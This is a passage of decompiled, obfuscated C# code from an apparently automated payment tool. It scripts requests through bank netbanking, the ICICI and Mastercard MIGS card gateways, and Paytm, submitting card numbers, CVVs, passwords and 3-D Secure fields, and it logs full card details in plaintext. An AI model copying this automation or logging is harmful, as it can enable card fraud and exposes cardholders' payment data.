                                    text4 = clsPostData.SetPost(text4, "authpassword", string_97);
                                    text4 = clsPostData.SetPost(text4, "cmbaccnumber", string_99);
                                    text4 = clsPostData.SetPost(text4, "cmbbranchaccnum", string_99);
                                    text4 = clsPostData.SetPost(text4, "hidacctnum", string_99);
                                    text4 = clsPostData.SetPost(text4, "hiddbaccnumber", string_99);
                                    text4 = clsPostData.SetPost(text4, "hiddbbrancode", string_98);
                                    text4 = clsPostData.SetPost(text4, "hiddbaccounttype", "SBGEN");
                                    text4 = clsPostData.SetPost(text4, "hiddbaccsubtype", "20101");
                                    text4 = clsPostData.SetPost(text4, "hiddbnumber", string_99);
                                    clsMain.Lock("Fourth Hit Inp = " + text4);
                                    if (_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                                    {
                                        clsMain.Lock("Fourth Output htm = " + string_95);
                                        if (string_95.Contains("<b>Executed</b>"))
                                        {
                                            string_91 = string_92;
                                            clsMain.Lock("Success ProcessCorpNB ");
                                            string_89 = string_95;
                                            string_90 = string_91;
                                            string_92 = "https://www.corpretail.com/RetailBank/core.logout.authenticate.redlogout.ajax.do";
                                            text4 = "";
                                            _Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0);
                                            return true;
                                        }
                                        string_90 = "Failed while processing payment.";
                                        clsMain.Lock("Fourth Hit Failed. Check HTML");
                                    }
                                    else
                                    {
                                        clsMain.Lock("Fourth Hit Failed. err = " + string_94);
                                        string_90 = "CORP NB Not Working - Payment Failed";
                                    }
                                }
                                else
                                {
                                    string_90 = "Failed while processing payment.";
                                    clsMain.Lock("Third Hit Failed. Check HTML");
                                }
                            }
                            else
                            {
                                clsMain.Lock("First Hit Failed. err = " + string_94);
                                string_90 = "Corp NB Not Working - Payment Failed";
                            }
                        }
                        else
                        {
                            clsMain.Lock("First Hit Failed htm = " + string_95);
                            string_90 = "Failed while Opening Corp";
                        }
                    }
                    else
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_94);
                        string_90 = "Corp NB Not Working - Payment Failed";
                    }
                    string_91 = string_92;
                    string_92 = "https://www.corpretail.com/RetailBank/core.logout.authenticate.logout.do";
                    text4 = class3_0.Method_SerialInp(string_95, ref string_93, false);
                    _Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0);
                    result2 = false;
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessCorpNB", ex.Message);
                    result2 = false;
                }
                return result2;
            }
            string_90 = "Some thing went wrong with Corp NB Payment";
            clsMain.Lock("Html doesn't contains corpretail.com, returning.");
            return false;
        }

        private static StringBuilder smethod_14(StringBuilder stringBuilder_0, byte byte_0)
        {
            return stringBuilder_0.Append(byte_0.ToString("x2"));
        }

        private static StringBuilder smethod_15(StringBuilder stringBuilder_0, byte byte_0)
        {
            return stringBuilder_0.Append(byte_0.ToString("x2"));
        }

        private string method_139(string string_86, string string_87)
        {
            string result = "";
            try
            {
                int startIndex = string_87.IndexOf("name=\"" + string_86 + "\"", StringComparison.CurrentCultureIgnoreCase);
                startIndex = string_87.LastIndexOf("<", startIndex);
                int length = string_87.IndexOf(">", startIndex) - startIndex;
                string text = string_87.Substring(startIndex, length).Replace("'", "\"");
                startIndex = text.IndexOf("value", StringComparison.CurrentCultureIgnoreCase);
                startIndex = text.IndexOf("\"", startIndex) + 1;
                length = text.IndexOf("\"", startIndex) - startIndex;
                result = HttpUtility.UrlEncode(text.Substring(startIndex, length));
                return result;
            }
            catch
            {
                return result;
            }
        }

        private string method_140(string string_86, string string_87)
        {
            string result = "";
            try
            {
                int startIndex = string_86.IndexOf(string_87 + "\"", StringComparison.CurrentCultureIgnoreCase);
                string text = string_86.Substring(startIndex);
                text = text.Substring(text.IndexOf(":\"") + 2);
                result = HttpUtility.UrlEncode(text.Substring(0, text.IndexOf("\"")));
                return result;
            }
            catch
            {
                return result;
            }
        }

        internal bool method_141(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            clsMain.Lock("Enter ProcessCC.  DETAILS: ");
            bool result2;
            if (!string_86.Contains("icicibank"))
            {
                string_91 = "Some thing went wrong with Credit Card Payment";
                clsMain.Lock("Html doesn't contains icicibank, returning.");
                result2 = false;
            }
            else
            {
                string_90 = "";
                string string_92 = class3_0.string_69;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string string_93 = array[7];
                string text4 = array[4];
                string text5 = array[5];
                string string_94 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_94, false);
                CookieContainer cookieContainer_ = null;
                text5 = ((text5.ToUpper()[0] != 'M') ? "VISA" : "MC");
                string string_95 = "";
                string string_96 = "";
                bool bool_ = false;
                HttpStatusCode httpStatusCode_ = HttpStatusCode.Accepted;
                if (text2.Length < 2)
                {
                    text2 = "0" + text2;
                }
                if (text.Trim().Length >= 16)
                {
                    try
                    {
                        clsMain.Lock("First Hit Inp = " + text6);
                        text6 = "";
                        if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_95);
                            string_91 = "CC Gateway not working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("First Output htm = " + string_96);
                        if (!string.IsNullOrEmpty(string_96.Trim()) && string_96.Contains("Payment Gateway"))
                        {
                            string_92 = string_94;
                            int num = string_96.IndexOf("https://payseal.icicibank.com/audioCaptch/audioCaptchaGenFile", StringComparison.CurrentCultureIgnoreCase);
                            int length = string_96.IndexOf("\"", num) - num;
                            text6 = string_96.Substring(num, length);
                            clsMain.Lock("Get Hit URL = " + text6);
                            method_100(text6, string_92, webProxy_3, ref cookieContainer_, true, true, 1000, ref string_95, ref bool_, ref webException_0, ref httpStatusCode_, ref string_95);
                            string_94 = "https://payseal.icicibank.com/mpi/Moto.jsp";
                            text6 = "IsSurchargeZero=yes&name1=Name+as+registered+with+your+Card+Issuer+%2F+Bank&NameOnCard=&CustEmail=&MobileNo=&RadioGroup1=radio&RadioGroupCrd=" + text5 + "%7C1&CardNumCrd1=" + text.Substring(0, 4) + "&CardNumCrd2=" + text.Substring(4, 4) + "&CardNumCrd3=" + text.Substring(8, 4) + "&CardNumCrd4=" + text.Substring(12, 4) + "&CardNumCrd5=&CardNumCrd=" + text + "&creditExpDtMon=" + text2 + "&creditExpDtYr=" + text3 + "&creditCVV=" + text4 + "&creditCID=&CaptchaValue=&MerchantType=SSL&isPayClicked=disabled&CardType=" + text5 + "&MerchantTxnID=" + method_140("MerchantTxnID", string_96) + "&MerchantID=" + method_140("MerchantID", string_96) + "&txnId=" + method_140("txnId", string_96) + "&IsMerchantMPI=Y&IsMerchantEMI=N&IsConvenienceFeeAllowed=N&CVV2FieldPresentIndicator=1&isDisplayCaptcha=&InstrType=CREDI&NBIssuerId=&NBIssuerName=&CustIpAddr=" + method_140("CustIpAddr", string_96) + "&isWalletRedirect=null&isCancelClicked=pay&isDCCMerchantAuth=N+&emiSupport=null&convenienceFeeSupport=null";
                            clsMain.Lock("Second Hit Inp = " + text6);
                            if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("First Hit Failed. err = " + string_95);
                                string_91 = "CC Gateway not working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Second Output htm = " + string_96);
                            if (string_96.IndexOf("submitVisaPage", StringComparison.CurrentCultureIgnoreCase) <= 0 && string_96.IndexOf("https://3dsecure.payseal.com/MultiMPI/from_icici_merchant.jsp", StringComparison.CurrentCultureIgnoreCase) <= 0)
                            {
                                string_91 = "Error Occured while Making Payment!";
                                clsMain.Lock(string_91 + ", Check HTML");
                                return false;
                            }
                            string_92 = string_94;
                            text6 = class3_0.Method_SerialInp(string_96, ref string_94, false);
                            clsMain.Lock("Third Hit URL = " + string_94 + " Inp = " + text6);
                            if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                string_91 = "Failed after Payment, Check Status.";
                                clsMain.Lock("Third Hit Failed. err = " + string_95);
                                bool_28 = true;
                                return false;
                            }
                            clsMain.Lock("Third Hit Output = " + string_96);
                            if (string_96.IndexOf("Submit to continue", StringComparison.CurrentCultureIgnoreCase) <= 0)
                            {
                                string_91 = "Error Occured while Making Payment!";
                                num = string_96.IndexOf("COLOR=\"red\">");
                                if (num > 0)
                                {
                                    num = string_96.IndexOf(">", num) + 1;
                                    length = string_96.IndexOf("<", num) - num;
                                    if (length > 0)
                                    {
                                        string_91 = string_96.Substring(num, length);
                                    }
                                }
                                clsMain.Lock(string_91 + ", Check HTML");
                                return false;
                            }
                            num = string_96.IndexOf("action=");
                            num = string_96.IndexOf("\"", num) + 1;
                            length = string_96.IndexOf("\"", num) - num;
                            string_94 = string_96.Substring(num, length);
                            num = string_96.IndexOf("PaReq", num);
                            num = string_96.IndexOf("value", num);
                            num = string_96.IndexOf("\"", num) + 1;
                            length = string_96.IndexOf("\"", num) - num;
                            string str = string_96.Substring(num, length);
                            num = string_96.IndexOf("TermUrl", num);
                            num = string_96.IndexOf("value", num);
                            num = string_96.IndexOf("\"", num) + 1;
                            length = string_96.IndexOf("\"", num) - num;
                            string str2 = string_96.Substring(num, length);
                            num = string_96.IndexOf("MD", num);
                            num = string_96.IndexOf("value", num);
                            num = string_96.IndexOf("\"", num) + 1;
                            length = string_96.IndexOf("\"", num) - num;
                            string text7 = string_96.Substring(num, length);
                            text6 = "PaReq=" + HttpUtility.UrlEncode(str) + "&TermUrl=" + HttpUtility.UrlEncode(str2) + "&MD=" + text7;
                            bool flag = false;
                            if (string_88.Contains("AXIS"))
                            {
                                flag = method_176(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                            }
                            else if (string_88.Contains("HDFC"))
                            {
                                flag = method_174(string_96, string_94, cookieContainer_, string_93, ref string_96, ref string_91);
                            }
                            else if (string_88.Contains("ICICI"))
                            {
                                flag = method_172(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                            }
                            else if (string_88.Contains("CITI"))
                            {
                                flag = method_173(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                            }
                            else if (string_88.Contains("INDU"))
                            {
                                flag = method_171(ref string_96, string_94, cookieContainer_, string_93, ref string_91, text6);
                            }
                            else if (string_88.Contains("ITZ"))
                            {
                                flag = method_177(ref string_96, string_94, cookieContainer_, string_93, ref string_91, text6);
                            }
                            else if (string_88.Contains("SBI"))
                            {
                                method_178(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                            }
                            else if (!string_88.Contains("IOB") && !string_88.Contains("BOB") && !string_88.Contains("CANARA"))
                            {
                                if (string_88.Contains("AIRTEL"))
                                {
                                    flag = method_175(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                                }
                            }
                            else
                            {
                                flag = method_170(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                                if (string_96.Contains("Invalid Credentials. Please try again."))
                                {
                                    string_91 = "Invalid Credentials. Please try again.";
                                    clsMain.Lock(string_88 + " Failed strerr = " + string_91);
                                    return false;
                                }
                            }
                            if (!flag)
                            {
                                clsMain.Lock(string_88 + " Failed strerr = " + string_91);
                                return false;
                            }
                            text6 = class3_0.Method_SerialInp(string_96, ref string_94, false);
                            string_92 = string_91;
                            clsMain.Lock("Third Hit Inp = " + text6);
                            if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_95);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Third Output htm = " + string_96);
                            if (string_96.IndexOf("submitForm", StringComparison.CurrentCultureIgnoreCase) <= 0)
                            {
                                string_91 = "Error Occured while Making Payment!";
                                clsMain.Lock(string_91 + ", Check HTML");
                                return false;
                            }
                            if (string_96.Contains("<!--"))
                            {
                                num = string_96.IndexOf("<!--");
                                length = string_96.IndexOf("-->", num);
                                if (length > num)
                                {
                                    string_96 = string_96.Remove(num, length - num + 3);
                                }
                            }
                            string_92 = string_94;
                            text6 = class3_0.Method_SerialInp(string_96, ref string_94, false);
                            if (text6.Contains("&ID="))
                            {
                                text6 = text6.Remove(text6.IndexOf("&ID="));
                            }
                            clsMain.Lock("Fourth Hit Inp = " + text6);
                            if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("Fourth Hit Failed. err = " + string_95);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Fourth Output htm = " + string_96);
                            if (string_96.IndexOf("motoForm", StringComparison.CurrentCultureIgnoreCase) <= 0)
                            {
                                string_91 = "Error Occured while Making Payment!";
                                clsMain.Lock(string_91 + ", Check HTML");
                                return false;
                            }
                            clsMain.Lock("Success ProcessCC");
                            string_90 = string_96;
                            string_91 = string_92;
                            return true;
                        }
                    }
                    catch (Exception ex)
                    {
                        clsMain.method_74("ProcessCC", ex.Message);
                        result = false;
                    }
                    return result;
                }
                string_91 = "16 Digit Card No. Required.";
                clsMain.Lock("First Hit Failed. err = " + string_91);
                result2 = false;
            }
            return result2;
        }

        internal bool method_142(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            clsMain.Lock("Enter ProcessCC_AxisPG.");
            if (string_86.Contains("mastercard"))
            {
                string_90 = "";
                string string_92 = class3_0.string_69;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string string_93 = array[7];
                string text3 = array[2];
                string text4 = array[4];
                string text5 = array[5];
                string string_94 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_94, false);
                CookieContainer cookieContainer_ = null;
                text5 = ((text5.ToUpper()[0] != 'M') ? "Visa" : "Mastercard");
                string string_95 = "";
                string string_96 = "";
                bool bool_ = false;
                HttpStatusCode httpStatusCode_ = HttpStatusCode.Accepted;
                if (text2.Length < 2)
                {
                    text2 = "0" + text2;
                }
                if (text3.Length > 2)
                {
                    text3 = text3.Substring(text3.Length - 2);
                }
                try
                {
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_95);
                        string_91 = "CC Gateway not working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_96);
                    int num;
                    int length;
                    if (!string.IsNullOrEmpty(string_96.Trim()) && string_96.Contains("preferred payment method"))
                    {
                        num = string_96.IndexOf("?card=" + text5);
                        length = string_96.IndexOf("\"", num) - num;
                        string_92 = string_94;
                        string_94 = "https://migs.mastercard.com.au/vpcpay" + string_96.Substring(num, length);
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!method_100(string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, ref string_96, ref bool_, ref webException_0, ref httpStatusCode_, ref string_95))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_95);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Second Output htm = " + string_96);
                        if (string_96.IndexOf("Submit card details", StringComparison.CurrentCultureIgnoreCase) <= 0)
                        {
                            string_91 = "Error Occured while Making Payment!";
                            clsMain.Lock(string_91 + ", Check HTML");
                            return false;
                        }
                        num = string_96.IndexOf("paymentId");
                        num = string_96.IndexOf("value", num);
                        num = string_96.IndexOf("\"", num) + 1;
                        length = string_96.IndexOf("\"", num) - num;
                        string text7 = string_96.Substring(num, length);
                        string_92 = string_94;
                        string_94 = "https://migs.mastercard.com.au/ssl";
                        text6 = "paymentId=" + text7 + "&cardno=" + text + "&cardexpirymonth=" + text2 + "&cardexpiryyear=" + text3 + "&cardsecurecode=" + text4 + "&payButtonImage.x=30&payButtonImage.y=11";
                        clsMain.Lock("Third Hit URL = " + string_94 + " Inp = " + text6);
                        if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                        {
                            string_91 = "Failed after Payment, Check Status.";
                            clsMain.Lock("Third Hit Failed. err = " + string_95);
                            bool_28 = true;
                            return false;
                        }
                        clsMain.Lock("Third Hit Output = " + string_96);
                        if (string_88.Contains("KOTAKVIRTUAL"))
                        {
                            num = string_96.IndexOf("/ssl?");
                            if (num > 0)
                            {
                                length = string_96.IndexOf("\"", num) - num;
                                string_94 = "https://migs.mastercard.com.au" + string_96.Substring(num, length).Trim();
                                goto IL_09b4;
                            }
                        }
                        if (string_96.IndexOf("Verified by Visa", StringComparison.CurrentCultureIgnoreCase) <= 0 && string_96.IndexOf("MasterCard SecureCode", StringComparison.CurrentCultureIgnoreCase) <= 0)
                        {
                            string_91 = "Error Occured while Making Payment!";
                            num = string_96.IndexOf("COLOR=\"red\">");
                            if (num > 0)
                            {
                                num = string_96.IndexOf(">", num) + 1;
                                length = string_96.IndexOf("<", num) - num;
                                if (length > 0)
                                {
                                    string_91 = string_96.Substring(num, length);
                                }
                            }
                            clsMain.Lock(string_91 + ", Check HTML");
                            return false;
                        }
                        num = string_96.IndexOf("action=");
                        num = string_96.IndexOf("\"", num) + 1;
                        length = string_96.IndexOf("\"", num) - num;
                        string_94 = string_96.Substring(num, length);
                        num = string_96.IndexOf("PaReq", num);
                        num = string_96.IndexOf("value", num);
                        num = string_96.IndexOf("\"", num) + 1;
                        length = string_96.IndexOf("\"", num) - num;
                        string str = string_96.Substring(num, length);
                        num = string_96.IndexOf("TermUrl", num);
                        num = string_96.IndexOf("value", num);
                        num = string_96.IndexOf("\"", num) + 1;
                        length = string_96.IndexOf("\"", num) - num;
                        string str2 = string_96.Substring(num, length);
                        num = string_96.IndexOf("MD", num);
                        num = string_96.IndexOf("value", num);
                        num = string_96.IndexOf("\"", num) + 1;
                        length = string_96.IndexOf("\"", num) - num;
                        string text8 = string_96.Substring(num, length);
                        text6 = "PaReq=" + HttpUtility.UrlEncode(str) + "&TermUrl=" + HttpUtility.UrlEncode(str2) + "&MD=" + text8;
                        bool flag = false;
                        if (string_88.Contains("AXIS"))
                        {
                            flag = method_176(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                        }
                        else if (string_88.Contains("HDFC"))
                        {
                            flag = method_174(string_96, string_94, cookieContainer_, string_93, ref string_96, ref string_91);
                        }
                        else if (string_88.Contains("ICICI"))
                        {
                            flag = method_172(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                        }
                        else if (string_88.Contains("CITI"))
                        {
                            flag = method_173(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                        }
                        else if (string_88.Contains("INDU"))
                        {
                            flag = method_171(ref string_96, string_94, cookieContainer_, string_93, ref string_91, text6);
                        }
                        else if (string_88.Contains("ITZ"))
                        {
                            flag = method_177(ref string_96, string_94, cookieContainer_, string_93, ref string_91, text6);
                        }
                        else if (string_88.Contains("SBI"))
                        {
                            method_178(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                        }
                        else if (!string_88.Contains("IOB") && !string_88.Contains("BOB") && !string_88.Contains("CANARA"))
                        {
                            if (string_88.Contains("AIRTEL"))
                            {
                                flag = method_175(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                            }
                        }
                        else
                        {
                            flag = method_170(ref string_96, string_94, cookieContainer_, string_93, ref string_91);
                            if (string_96.Contains("Invalid Credentials. Please try again."))
                            {
                                string_91 = "Invalid Credentials. Please try again.";
                                clsMain.Lock(string_88 + " Failed strerr = " + string_91);
                                return false;
                            }
                        }
                        if (!flag)
                        {
                            clsMain.Lock(string_88 + " Failed strerr = " + string_91);
                            return Class21.byte_0[108] > 0;
                        }
                        text6 = class3_0.Method_SerialInp(string_96, ref string_94, false);
                        string_92 = string_91;
                        clsMain.Lock("Third Hit Inp = " + text6);
                        if (!_Request(string_94, text6, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_95);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_96);
                        if (string_96.IndexOf("The server is processing your", StringComparison.CurrentCultureIgnoreCase) <= 0)
                        {
                            string_91 = "Error Occured while Making Payment!";
                            clsMain.Lock(string_91 + ", Check HTML");
                            return false;
                        }
                        goto IL_09b4;
                    }
                    goto end_IL_0123;
                IL_09b4:
                    string_92 = string_94;
                    clsMain.Lock("Fourth Hit Inp = " + text6);
                    if (!method_100(string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, ref string_96, ref bool_, ref webException_0, ref httpStatusCode_, ref string_95))
                    {
                        clsMain.Lock("Fourth Hit Failed. err = " + string_95);
                        string_91 = "Gateway Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("Fourth Output htm = " + string_96);
                    if (string_96.IndexOf("Your payment has been <b>approved", StringComparison.CurrentCultureIgnoreCase) <= 0)
                    {
                        string_91 = "Error Occured while Making Payment!";
                        clsMain.Lock(string_91 + ", Check HTML");
                        return false;
                    }
                    num = string_96.IndexOf("URL=") + 4;
                    length = string_96.IndexOf("\"", num) - num;
                    string_94 = string_96.Substring(num, length);
                    clsMain.Lock("Success ProcessCC_AxisPG");
                    string_90 = string_94;
                    string_91 = string_92;
                    return true;
                end_IL_0123:;
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessCC_AxisPG", ex.Message);
                    result = false;
                }
                return result;
            }
            string_91 = "Some thing went wrong with Credit Card Payment";
            clsMain.Lock("Html doesn't contains mastercard, returning.");
            return false;
        }

        private string GetString(string string_86, string string_87)
        {
            string result = "";
            try
            {
                string text = string_86.Substring(string_86.IndexOf("\"" + string_87));
                string text2 = text.Substring(text.IndexOf(string_87) + (string_87.Length + 3));
                text2 = text2.Substring(0, text2.IndexOf("\""));
                result = text2;
                return result;
            }
            catch
            {
                return result;
            }
        }

        private string GetString_(string string_86, string string_87, string string_88)
        {
            try
            {
                int num = string_87.Length + 3;
                string text = string_86.Substring(string_86.IndexOf(string_87) + num);
                return text.Substring(0, text.IndexOf(string_88));
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }
        }

        internal bool PayTM_Disha(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            if (!string_86.Contains("paytm") & !string_86.Contains("Paytm"))
            {
                string_91 = "Some thing went wrong with Credit Card Payment";
                clsMain.Lock("Html doesn't contains paytm, returning.");
                return false;
            }
            string text = string_88;
            string text2 = "";
            string string_92 = class3_0.string_69;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text3 = "";
            string text4 = "";
            string text5 = "";
            try
            {
                text3 = array[0].Trim();
                text4 = array[1];
                if (array.Length > 2)
                {
                    text5 = array[2];
                }
            }
            catch
            {
            }
            string string_93 = "";
            string text6 = "";
            string string_94 = "";
            string text7 = "";
            if (!string_88.Contains("_DC") && !string_88.Contains("_CC"))
            {
                if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PTMBHIMUPI"))
                {
                    text2 = "UPI";
                }
                else
                {
                    bool flag = array.Length > 4;
                    text2 = "NB";
                    string text8 = text;
                    switch (Class46.smethod_0(text8))
                    {
                        case 1145574292u:
                            if (text8 == "UNION")
                            {
                                text = "UNI";
                                text6 = "28";
                            }
                            break;
                        case 1005593931u:
                            if (text8 == "SBI")
                            {
                                text = "SBI";
                                text6 = "1";
                            }
                            break;
                        case 2970694650u:
                            if (text8 == "HDFC")
                            {
                                return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            break;
                        case 1934763940u:
                            if (text8 == "ICICI")
                            {
                                text6 = "44";
                            }
                            break;
                        case 3504019421u:
                            if (text8 == "IDBI")
                            {
                                text6 = "52";
                            }
                            break;
                        case 3298409214u:
                            if (!(text8 == "PAYTM"))
                            {
                                break;
                            }
                            if (clsMain.isAPP)
                            {
                                return Multi_PaytmPayApp(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                        case 4249340199u:
                            if (text8 == "INDUSIND")
                            {
                                text = "INDS";
                                text6 = "45";
                            }
                            break;
                        case 4021309901u:
                            if (text8 == "CORP")
                            {
                                text6 = "56";
                            }
                            else if (text8 == "AIRTELMONEY")
                            {
                                text6 = "56";
                            }
                            break;
                    }
                }
                string text9 = "";
                string value = "secure.paytm.in";
                string value2 = "securegw.paytm.in";
                text9 = class3_0.Method_SerialInp(string_86, ref string_93, true);
                if (!clsMain.isAPP)
                {
                    string text10 = string_86.Substring(string_86.IndexOf("name=\"ENC_DATA\" value=\"") + 23);
                    text10 = text10.Substring(0, text10.IndexOf("\""));
                    if (text10.Contains("\n"))
                    {
                        text10 = WebUtility.UrlEncode(text10);
                        string text11 = string_86.Substring(string_86.IndexOf("name=\"MID\" value=") + 18);
                        text11 = text11.Substring(0, text11.IndexOf("\""));
                        string text12 = string_86.Substring(string_86.IndexOf("name=\"CHECKSUMHASH\" value=") + 27);
                        text12 = text12.Substring(0, text12.IndexOf("\""));
                        text12 = WebUtility.UrlEncode(text12);
                        text9 = "MID=" + text11 + "&ENC_DATA=" + text10 + "&CHECKSUMHASH=" + text12;
                    }
                }
                if (string_86.Contains("ENC_DATA") && clsMain.isAPP)
                {
                    string string_95 = GetString_(string_86, "ENC_DATA\",\"value", "\"");
                    string_95 = HttpUtility.UrlEncode(string_95);
                    string_95 = string_95.Replace("%5cn", "%0A");
                    string string_96 = GetString_(string_86, "CHECKSUMHASH\",\"value", "\"");
                    string_96 = HttpUtility.UrlEncode(string_96);
                    string string_97 = GetString_(string_86, "MID\",\"value", "\"");
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    text9 = "MID=" + string_97 + "&CHECKSUMHASH=" + string_96 + "&ENC_DATA=" + string_95;
                }
                string text13 = string_93.Substring(0, string_93.IndexOf(".in/") + 3);
                Uri uri = new Uri(string_93);
                text13 = "https://" + uri.Host;
                for (int i = 0; i < uri.Segments.Length - 1; i++)
                {
                    text13 += uri.Segments[i];
                }
                string text14 = ((!string_93.Contains("oltp-web")) ? string_93.Substring(0, string_93.IndexOf(".in/") + 3) : "https://secure.paytm.in/oltp-web/");
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_98 = "";
                string string_99 = "";
                try
                {
                    Lock("First Hit Inp = " + text9);
                    if (!clsMain.isAPP)
                    {
                        text9 = method_162(text9);
                    }
                    if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_98);
                        string_91 = "Paytm Gateway not working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_99);
                    updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-1/3", tCntrlName_, null, null);
                    string_92 = string_93;
                    text13 = "https://securegw.paytm.in/theia/";
                    if (string.IsNullOrEmpty(string_99.Trim()) || !string_99.Contains("Paytm Secure"))
                    {
                        return result;
                    }
                    string text15 = string_99.Substring(string_99.IndexOf("var pushAppData=") + 17);
                    text15 = text15.Substring(0, text15.IndexOf("\""));
                    text15 = Class12.smethod_26(text15);
                    string @string = GetString(text15, "mid");
                    @string = GetString(text15, "mid");
                    string string2 = GetString(text15, "insufficientBalance\":true,\"id");
                    string text16 = method_14();
                    string string3 = GetString(string_99, "txnToken");
                    string string4 = GetString(text15, "txnAmount");
                    string3 = GetString(text15, "txnToken");
                    if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                    {
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text17 = "{\"payMethods\":[{\"payMethod\":\"DEBIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"payMethods\":[{\"payMethod\":\"CREDIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/fetchBinDetail?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
